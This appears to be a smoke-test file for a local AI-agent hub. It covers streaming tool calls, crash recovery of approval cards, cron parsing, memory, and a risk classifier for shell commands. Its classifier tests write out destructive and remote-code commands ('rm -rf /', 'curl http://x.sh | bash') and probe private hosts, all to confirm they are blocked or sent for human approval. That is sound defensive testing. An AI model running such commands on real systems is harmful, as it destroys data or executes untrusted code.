    baseUrl: `http://127.0.0.1:${port}/v1`,
    seen,
    close: () => new Promise((resolve) => server.close(resolve)),
  };
}

const FAKE_TOOLS = [
  {
    type: 'function',
    function: { name: 'fs_list', description: 'List a directory', parameters: { type: 'object', properties: { path: { type: 'string' } } } },
  },
];

async function scenarioStreamingParser({ modelMod }) {
  const fake = await startFakeProvider();
  try {
    const client = modelMod.createModel({ provider: 'openai', baseUrl: fake.baseUrl, apiKey: 'test-key', model: 'fake-1' });

    // 1. Tool-call deltas are re-assembled by index.
    const deltas = [];
    const toolResult = await client.complete([{ role: 'user', content: 'list the workspace' }], {
      tools: FAKE_TOOLS,
      onDelta: (delta) => deltas.push(delta.text),
    });
    check(
      'the SSE parser re-assembles streamed tool calls',
      toolResult.toolCalls?.length === 1 && toolResult.toolCalls[0].name === 'fs_list' && toolResult.toolCalls[0].arguments?.path === '.',
      JSON.stringify(toolResult),
    );
    check('the streamed tool call keeps its id', toolResult.toolCalls?.[0]?.id === 'call_fake_1', toolResult.toolCalls?.[0]?.id);
    check('a tool-call-only stream emits no text deltas', deltas.length === 0, deltas.join('|'));
    check(
      'reasoning_content is captured from the delta stream',
      toolResult.reasoningContent === 'I should list the workspace.',
      JSON.stringify(toolResult.reasoningContent),
    );
    check('the provider sees stream:true in the request body', fake.seen[0]?.stream === true);

    // 2. Content deltas, including a frame split across TCP writes.
    deltas.length = 0;
    const textResult = await client.complete(
      [
        { role: 'user', content: 'summarise' },
        {
          role: 'assistant',
          content: '',
          reasoning_content: 'prior thought',
          tool_calls: [{ id: 'call_1', type: 'function', function: { name: 'fs_list', arguments: '{}' } }],
        },
        { role: 'tool', tool_call_id: 'call_1', content: '{"ok":true}' },
      ],
      { tools: FAKE_TOOLS, onDelta: (delta) => deltas.push(delta.text) },
    );
    check('content deltas arrive in order', deltas.join('') === 'All done: three files.', deltas.join('|'));
    check('a frame split across TCP writes is still parsed', deltas[0] === 'All ', deltas[0]);
    check('the stream reports its finish reason', textResult.finishReason === 'stop', textResult.finishReason);
    check('streamed text is returned whole for the transcript', textResult.content === 'All done: three files.', textResult.content);

    // DeepSeek rejects the follow-up request unless the assistant message that
    // produced the tool call carries its reasoning_content back verbatim.
    const wireAssistant = (fake.seen.at(-1).messages || []).find((m) => m.role === 'assistant' && m.tool_calls);
    check(
      'assistant reasoning_content is replayed on the wire',
      wireAssistant?.reasoning_content === 'prior thought',
      JSON.stringify(wireAssistant || null),
    );
    check('tool_calls are still sent alongside it', Array.isArray(wireAssistant?.tool_calls) && wireAssistant.tool_calls.length === 1);

    // 3. End to end: point the live server at the fake provider and run a turn.
    const before = fake.seen.length;
    const put = await api('/api/settings', {
      method: 'PUT',
      body: { provider: 'openai', baseUrl: fake.baseUrl, model: 'fake-1', apiKey: 'sk-fake-key' },
    });
    check('settings can point the live model at a real endpoint', put.status === 200 && put.json?.model?.hasKey === true, put.text.slice(0, 160));

    const tested = await api('/api/settings/test', { method: 'POST', body: {} });
    check(
      'POST /api/settings/test performs a live completion and times it',
      tested.status === 200 && tested.json?.ok === true && tested.json?.mode === 'live' && typeof tested.json?.latencyMs === 'number',
      tested.text.slice(0, 200),
    );

    const stream = await openStream('chief');
    let turn;
    try {
      turn = await runTurn('chief', 'stream through the fake provider please', stream);
    } finally {
      stream.close();
    }
    check('a turn runs against the streaming provider', turn.status === 'success', turn.status);
    check(
      'the streamed tool call actually ran',
      turn.events.some((e) => e.type === 'tool.result' && e.name === 'fs_list' && e.ok === true),
      turn.events.map((e) => e.type).join(','),
    );
    const message = turn.events.find((e) => e.type === 'message' && e.final);
    const turnDeltas = turn.events.filter((e) => e.type === 'message.delta');
    check(
      'provider deltas reach the SSE client and concatenate correctly',
      Boolean(message) && turnDeltas.map((d) => d.text).join('') === message.text && message.text === 'All done: three files.',
      `${JSON.stringify(message?.text || '')} <- ${turnDeltas.map((d) => d.text).join('|')}`,
    );
    check(
      'every request the turn made asked for a stream',
      fake.seen.length > before && fake.seen.slice(before + 1).every((request) => request.stream === true),
      JSON.stringify(fake.seen.slice(before).map((request) => request.stream)),
    );

    // Regression: a reply that carries text AND a tool call must go back as ONE
    // assistant message. Two in a row is exactly what DeepSeek 400s on:
    // "The `reasoning_content` in the thinking mode must be passed back to the API."
    const mergedBefore = fake.seen.length;
    const mergedStream = await openStream('chief');
    try {
      await runTurn('chief', 'think-then-call please', mergedStream);
    } finally {
      mergedStream.close();
    }
    const followUp = fake.seen.slice(mergedBefore).at(-1);
    const roles = (followUp?.messages || []).map((m) => m.role);
    const doubled = roles.some((role, i) => role === 'assistant' && roles[i - 1] === 'assistant');
    check('no two consecutive assistant messages on the wire', !doubled, JSON.stringify(roles));
    const merged = (followUp?.messages || []).find((m) => m.role === 'assistant' && m.tool_calls);
    check(
      'the assistant turn carries its text and its tool_calls together',
      Boolean(merged) && String(merged.content).includes('Let me look.'),
      JSON.stringify(merged || null).slice(0, 200),
    );
    check(
      'the replayed assistant message keeps reasoning_content',
      merged?.reasoning_content === 'I should list the workspace.',
      JSON.stringify(merged?.reasoning_content),
    );

    const backToMock = await api('/api/settings', {
      method: 'PUT',
      body: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: '' },
    });
    check('the model can be switched back to mock without a restart', backToMock.status === 200 && backToMock.json?.model?.hasKey === false, backToMock.text.slice(0, 160));
  } finally {
    await fake.close();
  }
}

async function scenarioCrashRecovery() {
  const pairingBefore = (await api('/api/pairing')).json;

  const stream = await openStream('ops');
  let post;
  let request;
  try {
    post = await api('/api/bots/ops/message', {
      method: 'POST',
      body: { text: 'Write a note outside the workspace: epsilon' },
    });
    request = await stream.waitFor((e) => e.type === 'approval.request', 10000, 'approval.request before the crash');
  } finally {
    stream.close();
  }
  check('a live turn raised an approval card before the crash', post.status === 200 && Boolean(request?.approvalId));

  const pendingFile = path.join(home, 'data', 'pending.json');
  await waitUntil(async () => {
    const raw = await fsp.readFile(pendingFile, 'utf8').catch(() => '');
    return raw.includes(request.approvalId);
  }, 5000, 'pending.json to contain the card');
  const savedPending = JSON.parse(await fsp.readFile(pendingFile, 'utf8'));
  check('pending approvals are persisted to data/pending.json', savedPending.approvals?.some((a) => a.id === request.approvalId));

  const turnPath = path.join(home, 'data', 'turns', `${post.json.turnId}.json`);
  const running = JSON.parse(await fsp.readFile(turnPath, 'utf8').catch(() => '{}'));
  check('an in-flight turn is persisted with status running', running.status === 'running', JSON.stringify(running).slice(0, 160));

  // A power cut, not a shutdown: no chance to write anything else.
  await killChildHard();
  await sleep(250);

  await bootServer();
  const health = await api('/api/health');
  check('the server restarts on the same data directory', health.status === 200 && health.json?.ok === true);

  const pendingAfter = await api('/api/approvals?status=pending');
  const restoredCard = pendingAfter.json.find((a) => a.id === request.approvalId);
  check('the pending approval survives the restart', Boolean(restoredCard), pendingAfter.text.slice(0, 240));
  check('the restored card is flagged as restored', restoredCard?.restored === true);

  const recovered = JSON.parse(await fsp.readFile(turnPath, 'utf8').catch(() => '{}'));
  check(
    'an interrupted turn becomes needs_attention',
    recovered.status === 'needs_attention' && recovered.interrupted === true,
    JSON.stringify(recovered).slice(0, 200),
  );

  const opsMessages = await api('/api/bots/ops/messages');
  check(
    'the message log explains that the turn was interrupted',
    opsMessages.json.some((m) => m.role === 'assistant' && String(m.text || '').includes('server stopped')),
    opsMessages.text.slice(-300),
  );
  check(
    'the message log shows a needs_attention status item',
    opsMessages.json.some((m) => m.role === 'status' && m.status === 'needs_attention'),
  );

  const decide = await api(`/api/approvals/${request.approvalId}`, {
    method: 'POST',
    body: { decision: 'approve', note: 'after restart' },
  });
  check('a restored card can still be approved', decide.status === 200 && decide.json?.approval?.status === 'approved', decide.text.slice(0, 200));
  check('a late decision is marked late', decide.json?.approval?.late === true);

  const opsAfter = await api('/api/bots/ops/messages');
  check(
    'the restored decision is appended to the transcript',
    opsAfter.json.some((m) => m.role === 'approval' && m.approvalId === request.approvalId && m.decision === 'approved'),
    opsAfter.text.slice(-300),
  );
  check(
    'the message log says the rest of the turn did not resume',
    opsAfter.json.some((m) => m.role === 'assistant' && String(m.text || '').includes('did not resume')),
    opsAfter.text.slice(-300),
  );

  // The one thing a restart can still honour: a live-chat card the human just
  // approved had provably not run yet, so the approved tool call is replayed.
  const outside = await fsp.readFile(path.join(home, 'outside-note.md'), 'utf8').catch(() => '');
  check('approving a restored live-chat card replays the approved tool', outside.includes('epsilon'), outside.slice(0, 120));
  check(
    'the replayed tool result appears in the message log',
    opsAfter.json.some((m) => m.role === 'tool' && m.name === 'fs_write' && m.ok === true),
    opsAfter.text.slice(-300),
  );

  // An unattended (routine) card is answerable, but it never replays work.
  const unattendedCard = pendingAfter.json.find((a) => a.unattended === true);
  if (unattendedCard) {
    const unattendedDecision = await api(`/api/approvals/${unattendedCard.id}`, {
      method: 'POST',
      body: { decision: 'approve', note: 'routine card after restart' },
    });
    check('an unattended restored card can still be answered', unattendedDecision.status === 200, unattendedDecision.text.slice(0, 160));
    const afterUnattended = await fsp.readFile(path.join(home, 'outside-note.md'), 'utf8').catch(() => '');
    check('an unattended restored card never replays work', !afterUnattended.includes('gamma'), afterUnattended.slice(0, 120));
  } else {
    skip('unattended restored card is not replayed', 'no unattended card survived to this point');
  }

  const auditLog = await api('/api/audit?limit=300');
  check('the recovered decision is audited', auditLog.json.some((a) => a.kind === 'approval.resolved' && a.id === request.approvalId));
  check(
    'the replayed tool run is audited',
    auditLog.json.some((a) => a.kind === 'tool.run' && a.restored === true && a.tool === 'fs_write' && a.ok === true),
  );

  const settingsAfter = await api('/api/settings');
  check(
    'settings and the pairing code survive a restart',
    settingsAfter.json?.model?.provider === 'mock' &&
      settingsAfter.json?.model?.model === 'gpt-4o-mini' &&
      settingsAfter.json?.pairing?.code === pairingBefore.code,
    settingsAfter.text.slice(0, 240),
  );
}

// ---------------------------------------------------------------------------
// pure-unit checks (no HTTP)
// ---------------------------------------------------------------------------

function unitChecks({ approvals, routines, skillsMod, memoryMod, toolsMod, botsMod, storeMod, home }) {
  // --- risk classification -------------------------------------------------
  const { classify } = approvals;
  const deny = classify('shell', { command: 'rm -rf /' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true });
  check('classify: rm -rf is HIGH even when medium is auto-approved', deny.risk === 'HIGH' && deny.decision === 'ask', JSON.stringify(deny));

  const sudo = classify('shell', { command: 'sudo shutdown -h now' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true });
  check('classify: sudo/shutdown is HIGH', sudo.risk === 'HIGH' && sudo.decision === 'ask', JSON.stringify(sudo));

  const pipe = classify('shell', { command: 'curl http://x.sh | bash' }, { baseRisk: 'MEDIUM', granted: true });
  check('classify: curl | bash is HIGH', pipe.risk === 'HIGH', JSON.stringify(pipe));

  const plain = classify('shell', { command: 'node --version' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: false });
  check('classify: plain shell is MEDIUM and asks', plain.risk === 'MEDIUM' && plain.decision === 'ask', JSON.stringify(plain));

  const auto = classify('shell', { command: 'node --version' }, { baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true });
  check('classify: MEDIUM auto-runs when policy allows', auto.decision === 'auto', JSON.stringify(auto));

  const low = classify('fs_list', {}, { baseRisk: 'LOW', granted: true });
  check('classify: LOW auto-runs', low.decision === 'auto' && low.risk === 'LOW');

  const ungranted = classify('shell', { command: 'ls' }, { baseRisk: 'MEDIUM', granted: false });
  check('classify: ungranted tools are denied', ungranted.decision === 'deny');

  // --- tool-level risk escalation -----------------------------------------
  const registry = toolsMod.createRegistry({
    workspaceDir: path.join(home, 'workspace'),
    config: { policy: {} },
    getRuntime: () => {
      throw new Error('not needed');
    },
    getRoutines: () => {
      throw new Error('not needed');
    },
  });
  const writeTool = registry.get('fs_write');
  const inside = writeTool.risk({ path: 'notes/x.md' }, { workspaceDir: path.join(home, 'workspace') });
  const outside = writeTool.risk({ path: '../escape.md' }, { workspaceDir: path.join(home, 'workspace') });
  check('fs_write inside the workspace is LOW', inside.risk === 'LOW');
  check('fs_write outside the workspace escalates to HIGH', outside.risk === 'HIGH' && Boolean(outside.reason));
  check('registry does not grant shell to a bot without it', registry.isGranted({ tools: ['fs_read'] }, 'shell') === false);
  check('task_finish is always granted', registry.isGranted({ tools: [] }, 'task_finish') === true);

  // --- network guard (offline-safe: the private host is blocked before any DNS)
  return unitAsync({ toolsMod, registry, routines, skillsMod, memoryMod, botsMod, storeMod });
}

async function unitAsync({ toolsMod, registry, routines, skillsMod, memoryMod, botsMod, storeMod }) {
  const httpTool = registry.get('http_fetch');
  let blocked = null;
  try {
    await httpTool.run({ url: 'http://127.0.0.1:9/secret' }, { workspaceDir: path.join(home, 'workspace') });
  } catch (err) {
    blocked = err;
  }
  check('http_fetch blocks loopback/private hosts', blocked?.code === 'PRIVATE_HOST_BLOCKED', blocked?.code || 'no error');

  check('isPrivateHost flags 10/8 and 169.254', toolsMod.isPrivateHost('10.1.2.3') && toolsMod.isPrivateHost('169.254.169.254'));
  check('isPrivateHost allows a public host', toolsMod.isPrivateHost('example.com') === false);

  // browser_open without CHROME_PATH must answer, not throw.
  const browserTool = registry.get('browser_open');
  const browserResult = await browserTool.run({ url: 'https://example.com' }, { workspaceDir: path.join(home, 'workspace') });
  check(
    'browser_open returns a structured not_configured error',
    browserResult.ok === false && browserResult.error?.code === 'not_configured',
    JSON.stringify(browserResult).slice(0, 120),
  );

  // --- cron ---------------------------------------------------------------
  const every5 = routines.parseCron('*/5 * * * *');
  const from = Date.now();
  const next5 = routines.nextRunFor(every5, from, 'UTC');
  check('cron */5 * * * * fires within 5 minutes', next5 > from && next5 - from <= 5 * 60 * 1000 + 1000, `${Math.round((next5 - from) / 1000)}s`);

  const weekdays = routines.parseCron('0 9 * * 1-5');
  const nextWeekday = routines.nextRunFor(weekdays, from, 'Asia/Shanghai');
  const shanghai = routines.tzParts(nextWeekday, 'Asia/Shanghai');
  check('cron 0 9 * * 1-5 lands at 09:00 Shanghai', shanghai.hour === 9 && shanghai.minute === 0, JSON.stringify(shanghai));
  check('cron weekday schedule skips the weekend', [1, 2, 3, 4, 5].includes(shanghaiWeekday(nextWeekday)), `weekday ${shanghaiWeekday(nextWeekday)}`);

  const interval = routines.parseSchedule('every 30 minutes');
  check('interval schedule parses', interval.kind === 'interval' && interval.intervalMs === 30 * 60000);
  check('interval nextRun is exactly one interval later', routines.nextRunFor(interval, from, 'UTC') === from + 30 * 60000);

  let cronError = null;
  try {
    routines.parseCron('not a cron');
  } catch (err) {
    cronError = err;
  }
  check('invalid cron throws CRON_INVALID', cronError?.code === 'CRON_INVALID', cronError?.message);

  let cronRangeError = null;
  try {
    routines.parseCron('99 0 * * *');
  } catch (err) {
    cronRangeError = err;
  }
  check('out-of-range cron field is rejected', cronRangeError?.code === 'CRON_INVALID');

  // --- skills frontmatter -------------------------------------------------
  const skill = await skillsMod.readSkill('release-check');
  check('frontmatter parser reads name/steps/validation', skill?.name === 'release-check' && skill.steps.length >= 4 && Boolean(skill.validation));
  check('frontmatter parser keeps approval_notes', String(skill?.approval_notes || '').includes('HIGH'));
  const digest = await skillsMod.renderSkillsDigest(['release-check']);
  check('skills digest only includes granted skills', digest.includes('release-check') && !digest.includes('workspace-sweep'), digest.slice(0, 120));

  // --- memory retrieval ---------------------------------------------------
  await memoryMod.appendMemory('researcher', 'The user prefers citations with dates and no bullet points longer than two lines.');
  await memoryMod.appendMemory('researcher', 'The staging server lives on a private network and needs a VPN.');
  await memoryMod.appendMemory('shared', 'The user goes by Sam and works in the Asia/Shanghai timezone.');
  const hits = await memoryMod.retrieve({ botId: 'researcher', query: 'citation style preferences', limit: 3 });
  check('memory retrieval ranks by keyword overlap', hits.length > 0 && hits[0].text.includes('citations'), JSON.stringify(hits.map((h) => h.text.slice(0, 40))));
  const sharedHit = await memoryMod.retrieve({ botId: 'researcher', query: 'timezone', limit: 3 });
  check('shared facts are visible to a bot', sharedHit.some((h) => h.source === 'shared' && h.text.includes('Asia/Shanghai')));
  const scoped = await memoryMod.retrieve({ botId: 'chief', query: 'VPN staging', includeShared: false, limit: 3 });
  check('memory is scoped per bot', scoped.every((h) => h.source === 'chief'), JSON.stringify(scoped.map((h) => h.source)));

  // --- sidebar previews (pure, against hand-written session logs) ----------
  const sessionsDir = path.join(home, 'data', 'sessions');
  await fsp.mkdir(sessionsDir, { recursive: true });
  const writeSession = (botId, records) =>
    fsp.writeFile(path.join(sessionsDir, `${botId}.jsonl`), `${records.map((r) => JSON.stringify(r)).join('\n')}\n`);

  const ts = '2026-01-02T03:04:05.000Z';
  const longUser = `please summarise ${'x'.repeat(200)}`;
  const longAssistant = `First line of the answer.\n\nSecond paragraph ${'y'.repeat(140)}`;
  await writeSession('previewprobe', [
    { ts, kind: 'user', text: longUser },
    { ts, kind: 'assistant', text: longAssistant },
    { ts, kind: 'tool', name: 'fs_read', args: {}, ok: true, output: { data: 'noise' } },
    { ts, kind: 'approval', toolName: 'fs_write', risk: 'HIGH' },
    { ts, kind: 'turn', status: 'success', summary: 'done' },
  ]);

  const preview = await botsMod.lastMessagePreview('previewprobe');
  const expectedPreview = Array.from(longAssistant.replace(/\s+/g, ' ').trim())
    .slice(0, 120)
    .join('');
  checkEqual('preview: the last meaningful message is the assistant reply', preview?.text, expectedPreview);
  check('preview: whitespace is flattened to one line', preview?.text?.includes('First line of the answer. Second paragraph'));
  check('preview: exactly 120 characters, truncated without an ellipsis', Array.from(preview?.text || '').length === 120);
  checkEqual('preview: kind is the record kind', preview?.kind, 'assistant');
  checkEqual('preview: ts is the record timestamp', preview?.ts, ts);
  check('preview: tool/approval/turn rows are skipped', !String(preview?.text).includes('fs_read'));

  check('preview: a bot with no transcript has no preview', (await botsMod.lastMessagePreview('never-spoke')) === null);

  await writeSession('noiseonly', [
    { ts, kind: 'tool', name: 'shell', output: 'x' },
    { ts, kind: 'approval', toolName: 'shell', risk: 'MEDIUM' },
    { ts, kind: 'turn', status: 'failed' },
  ]);
  check('preview: a transcript of only tool/status rows yields null', (await botsMod.lastMessagePreview('noiseonly')) === null);

  await fsp.writeFile(
    path.join(sessionsDir, 'torn.jsonl'),
    `${JSON.stringify({ ts, kind: 'user', text: 'intact despite the torn line' })}\n{"kind":"assis`,
  );
  checkEqual('preview: a torn last line does not hide the message before it', (await botsMod.lastMessagePreview('torn'))?.text, 'intact despite the torn line');

  // ~520 KB of tool noise *after* the last real message: the tail reader has to
  // widen its window instead of reading the whole log or giving up.
  const wall = [];
  for (let i = 0; i < 4000; i += 1) wall.push({ ts, kind: 'tool', name: 'fs_read', output: `noise ${i} ${'z'.repeat(80)}` });
  await writeSession('noisy', [{ ts, kind: 'user', text: 'buried but real' }, ...wall]);
  const wallSize = (await fsp.stat(path.join(sessionsDir, 'noisy.jsonl'))).size;
  check('preview: the noise wall really is bigger than the first tail window', wallSize > 512 * 1024, `${Math.round(wallSize / 1024)} KB`);
  checkEqual('preview: the reader widens past a wall of tool output', (await botsMod.lastMessagePreview('noisy'))?.text, 'buried but real');

  const tail = await storeMod.readJsonlTail(path.join(sessionsDir, 'noisy.jsonl'), { windowBytes: 4096, maxBytes: 4096 });
  check(
    'readJsonlTail reads a bounded tail of whole records',
    tail.length > 0 && tail.every((record) => record.kind === 'tool') && tail.length < 100,
    `${tail.length} records`,
  );
  check('readJsonlTail returns [] for a missing file', (await storeMod.readJsonlTail(path.join(sessionsDir, 'nope.jsonl'))).length === 0);
}

function shanghaiWeekday(ts) {
  // Monday=1 .. Sunday=7, matching ISO weekdays.
  const parts = new Intl.DateTimeFormat('en-US', { timeZone: 'Asia/Shanghai', weekday: 'short' }).format(new Date(ts));
  return { Mon: 1, Tue: 2, Wed: 3, Thu: 4, Fri: 5, Sat: 6, Sun: 7 }[parts];
}


  // A removed element must not break boot: every `$('id').addEventListener`
  // without optional chaining has to point at markup that still exists.
  {
    const html = await fsp.readFile(new URL('../public/index.html', import.meta.url), 'utf8');
    const ids = [...html.matchAll(/\$\('([A-Za-z0-9_-]+)'\)\.addEventListener/g)].map((m) => m[1]);
    const missing = [...new Set(ids)].filter((id) => !html.includes(`id="${id}"`));
    check('no unguarded listener wiring for removed elements', missing.length === 0, `missing: ${missing.join(', ')}`);
  }


  // The product ships ONE bot that can do everything; specialists are created
  // on demand. Old installs keep their bots, but an untouched "总管" is renamed.
  {
    const seeded = (await fsp.readdir(new URL('../config/bots/', import.meta.url))).filter((n) => n.endsWith('.json'));
    check('config ships exactly one bot', seeded.length === 1 && seeded[0] === 'chief.json', seeded.join(','));
    const seed = JSON.parse(await fsp.readFile(new URL('../config/bots/chief.json', import.meta.url), 'utf8'));
    const needed = ['shell', 'fs_write', 'fs_delete', 'browser_open', 'http_fetch', 'bot_create', 'group_create', 'routine_create', 'settings_update', 'ui_set'];
    check('the one bot is granted every capability', needed.every((n) => seed.tools.includes(n)), needed.filter((n) => !seed.tools.includes(n)).join(','));
    check('the one bot is called 助理', seed.name === '助理' && seed.primary === true);
  }

  // One machine concept: the old "看谁的屏幕" take-over list must not come back.
  {
    const html = await fsp.readFile(new URL('../public/index.html', import.meta.url), 'utf8');
    check('no separate take-over target list in the UI', !/desk.vncTargets|id="pc-target"/.test(html));
    const preload = await fsp.readFile(new URL('../desktop/shell-preload.cjs', import.meta.url), 'utf8');
    check(
      'the desktop bridge can add, rename and remove machines',
      ['addMachine', 'renameMachine', 'removeMachine', 'switchHub', 'listMachines'].every((k) => preload.includes(k)),
    );
  }

  // The machine controls must actually be wired; "no reaction" is a bug.
  {
    const html = await fsp.readFile(new URL('../public/index.html', import.meta.url), 'utf8');
    for (const id of ['set-add-machine', 'set-machines-list', 'machine-btn', 'machine-menu']) {
      check(`machine control ${id} is wired`, html.includes(`$('${id}')?.addEventListener`) || html.includes(`$('${id}').addEventListener`));
    }
  }

main().catch(async (err) => {
  console.error('');
  console.error('SMOKE CRASHED:', err?.stack || err);
  await stopChild().catch(() => {});
  process.exitCode = 1;
});

async function scenarioMachinesAndPolicy({ approvals, toolsMod }) {
  // Approval levels and the human's own blocked words.
  {
    const ap = await import('../src/approvals.mjs');
    const lvl = (policy) => ap.effectivePolicy(policy);
    check('levels: old configs map onto standard / auto', lvl({}).level === 'standard' && lvl({ autoApproveAll: true }).level === 'auto' && lvl({ level: 'careful', autoApproveAll: true }).level === 'careful');
    const decide = (level, risk, trusted = false, cmd = 'ls', extra = []) => {
      const m = ap.effectivePolicy({ level, extraDeny: extra });
      return ap.classify('shell', { command: cmd }, {
        baseRisk: risk,
        autoApproveMedium: m.careful ? false : (trusted || m.autonomous),
        autoApproveAll: m.autonomous,
        denyPatterns: m.denyPatterns,
      }).decision;
    };
    check('levels: careful asks even for a trusted bot', decide('careful', 'MEDIUM', true) === 'ask' && decide('careful', 'HIGH') === 'ask');
    check('levels: standard lets a trusted bot do routine work, asks for high risk', decide('standard', 'MEDIUM', true) === 'auto' && decide('standard', 'MEDIUM', false) === 'ask' && decide('standard', 'HIGH') === 'ask');
    check('levels: hands-off runs high risk but the danger list still asks', decide('auto', 'HIGH') === 'auto' && decide('auto', 'MEDIUM', false, 'rm -rf /') === 'ask');
    const extra = [{ id: 'd1', text: 'git push', pattern: ap.phraseToPattern('git push') }];
    check('blocked words: a word you added stops a command even in hands-off', decide('auto', 'MEDIUM', false, 'git push origin main', extra) === 'ask' && decide('auto', 'MEDIUM', false, 'git pull', extra) === 'auto');
  }
  // One-sentence rules: matched by meaning (a stand-in model here), ask wins.
  {
    const R = await import('../src/rules.mjs');
    const ap = await import('../src/approvals.mjs');
    const rules = [{ id: 'r1', text: '发邮件先问我', action: 'ask' }, { id: 'r2', text: '装软件直接做', action: 'allow' }];
    let calls = 0;
    const fakeModel = { complete: async (msgs) => { calls += 1; const a = msgs[1].content; return { content: /sendmail|smtp/.test(a) ? '{"rules":[1]}' : /apt-get install/.test(a) ? '{"rules":[2]}' : /both/.test(a) ? '{"rules":[2,1]}' : '{"rules":[]}' }; } };
    const D = ap.DECISION;
    const v = (decision, reason = 'medium-risk tool') => ({ risk: 'MEDIUM', decision, reason });
    const mail = R.applyRules(v(D.AUTO), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'sendmail bob@x <a.txt' }, model: fakeModel }), D);
    const install = R.applyRules(v(D.ASK), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'apt-get install htop' }, model: fakeModel }), D);
    const both = R.applyRules(v(D.ASK), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'both' }, model: fakeModel }), D);
    const danger = R.applyRules(v(D.ASK, 'command matches danger denylist (x)'), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'apt-get install x' }, model: fakeModel }), D);
    const none = R.applyRules(v(D.AUTO), await R.judgeRules({ rules, toolName: 'fs_list', args: { path: '.' }, model: fakeModel }), D);
    check('rules: an ask-first rule makes a hands-off action ask', mail.decision === 'ask' && /发邮件先问我/.test(mail.reason));
    check('rules: an allow rule removes the prompt, ask wins when both match', install.decision === 'auto' && both.decision === 'ask');
    check('rules: an allow rule never overrides the danger list; unrelated actions untouched', danger.decision === 'ask' && none.decision === 'auto');
    const before = calls;
    await R.judgeRules({ rules, toolName: 'shell', args: { command: 'sendmail bob@x <a.txt' }, model: fakeModel });
    check('rules: the same action is judged once (cached)', calls === before);
    const add = await api('/api/policy', { method: 'PUT', body: { addRule: { text: '发邮件先问我', action: 'ask' } } });
    const rid = add.json?.rules?.[0]?.id;
    const bad = await api('/api/policy', { method: 'PUT', body: { addRule: { text: '  ' } } });
    const del = await api('/api/policy', { method: 'PUT', body: { removeRule: rid } });
    const tv = await api('/api/policy', { method: 'PUT', body: { takeover: 'view' } });
    const tbad = await api('/api/policy', { method: 'PUT', body: { takeover: 'drive' } });
    const tback = await api('/api/policy', { method: 'PUT', body: { takeover: 'control' } });
    check('takeover setting: view only and back, bad value refused', tv.json?.takeover === 'view' && tbad.status === 400 && tback.json?.takeover === 'control');
    // Activity log: permission changes, ability changes and takeovers land there.
    await api('/api/audit/takeover', { method: 'POST', body: { botId: 'chief', mode: 'view' } });
    const changes = (await api('/api/audit?view=changes&limit=50')).json || [];
    const takeovers = (await api('/api/audit?view=takeover&limit=10')).json || [];
    const raw = (await api('/api/audit?limit=5')).json || [];
    check('activity log: permission changes are recorded', changes.some((r) => r.kind === 'policy.changed' && r.change?.addRule?.text === '发邮件先问我'));
    check('activity log: a takeover is recorded with its mode; filters keep to their kind', takeovers[0]?.kind === 'desktop.takeover' && takeovers[0]?.mode === 'view' && takeovers.every((r) => r.kind === 'desktop.takeover') && changes.every((r) => /policy.changed|bot.abilities/.test(r.kind)) && Array.isArray(raw));
    check('rules API: add, refuse empty, remove', add.json?.rules?.[0]?.action === 'ask' && bad.status === 400 && del.json?.rules?.length === 0);
  }
  // Per-bot abilities: switching one off is remembered through edits and migrations.
  {
    const fsx = await import('node:fs');
    const botFileOf = (id) => path.join(home, 'config', 'bots', `${id}.json`);
    const chief = (await api('/api/bots/chief')).json?.bot || JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    const without = (chief.tools || []).filter((t) => t !== 'shell');
    await api('/api/bots/chief', { method: 'PATCH', body: { tools: without } });
    await api('/api/bots/chief', { method: 'PATCH', body: { role: '改个职责' } });
    const stored = JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    check('abilities: a removed ability is remembered, edits keep the migration marker', !stored.tools.includes('shell') && stored.revokedTools?.includes('shell') && Number(stored.seedGrantsVersion) > 0, JSON.stringify({ rv: stored.revokedTools, v: stored.seedGrantsVersion }));
    const { migrateSeedGrants } = await import('../src/bots.mjs');
    stored.seedGrantsVersion = 0; // pretend a newer release ships grants
    fsx.writeFileSync(botFileOf('chief'), JSON.stringify(stored, null, 2));
    await migrateSeedGrants();
    const after = JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    check('abilities: a later grant migration does not hand a removed ability back', !after.tools.includes('shell') && after.tools.includes('browser_open'));
    await api('/api/bots/chief', { method: 'PATCH', body: { tools: [...after.tools, 'shell'], role: chief.role } });
    const back = JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    check('abilities: switching it back on clears the record', back.tools.includes('shell') && !(back.revokedTools || []).includes('shell'));
    const abil = (await api('/api/audit?view=changes&limit=50')).json || [];
    check('activity log: ability changes are recorded (removed, then added back)', abil.some((r) => r.kind === 'bot.abilities' && (r.removed || []).includes('shell')) && abil.some((r) => r.kind === 'bot.abilities' && (r.added || []).includes('shell')));
  }
  {
    const get = await api('/api/policy');
    const set = await api('/api/policy', { method: 'PUT', body: { level: 'careful' } });
    const add = await api('/api/policy', { method: 'PUT', body: { addDeny: 'git push' } });
    const id = add.json?.extraDeny?.[0]?.id;
    const del = await api('/api/policy', { method: 'PUT', body: { removeDeny: id } });
    const bad = await api('/api/policy', { method: 'PUT', body: { level: 'yolo' } });
    await api('/api/policy', { method: 'PUT', body: { level: 'standard' } });
    check('policy API: level, add and remove a blocked word, bad level refused', get.status === 200 && set.json?.level === 'careful' && add.json?.extraDeny?.[0]?.text === 'git push' && del.json?.extraDeny?.length === 0 && bad.status === 400);
  }
  const registry = toolsMod.createRegistry({
    workspaceDir: path.join(home, 'workspace'),
    config: {},
    getRuntime: () => { throw new Error('machine tools never start turns'); },
    getRoutines: () => { throw new Error('machine tools never run routines'); },
  });
  // Windows has no websockify: the hub's own WebSocket <-> VNC bridge.
  {
    const net = await import('node:net');
    const { bridgeWebSocket } = await import('../src/wsbridge.mjs');
    const vnc = net.createServer((s) => { s.write('RFB 003.008\n'); s.on('data', (d) => s.write(d)); s.on('error', () => {}); });
    await new Promise((r) => vnc.listen(0, '127.0.0.1', r));
    const relay = http.createServer();
